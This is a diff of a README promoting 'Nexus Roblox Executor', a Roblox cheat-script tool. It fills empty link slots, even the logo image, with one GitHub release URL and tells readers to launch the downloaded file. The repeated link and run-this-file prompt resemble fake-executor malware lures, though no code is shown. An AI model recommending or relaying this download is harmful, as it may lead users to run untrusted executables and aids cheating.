@@ -22,16 +22,16 @@
 
 Ready to experience the power of Nexus Executor? Download the executor from the link below:
 
-[![Download Nexus Executor]()]()
+[![Download Nexus Executor](https://github.com/buptyo-100/Nexus-Roblox/releases/tag/Nexus)](https://github.com/buptyo-100/Nexus-Roblox/releases/tag/Nexus)
 
 📌 **Note:** If the link ends with the file name, make sure to launch the downloaded file to access Nexus Executor.
 
 ## Explore Further 🌐
 
-Visit our website []() to discover more about Nexus Executor and explore additional features and resources.
+Visit our website [https://github.com/buptyo-100/Nexus-Roblox/releases/tag/Nexus](https://github.com/buptyo-100/Nexus-Roblox/releases/tag/Nexus) to discover more about Nexus Executor and explore additional features and resources.
 
 ---
 
 With Nexus Roblox Executor, scripting in Roblox becomes a seamless and enjoyable experience. Join the community of scripters leveraging the power of Nexus Executor today! If you encounter any issues with the download link, feel free to check the "Releases" section for alternative options. Happy scripting! 🎮💻
 
-![Roblox Logo]()
+![Roblox Logo](https://github.com/buptyo-100/Nexus-Roblox/releases/tag/Nexus)
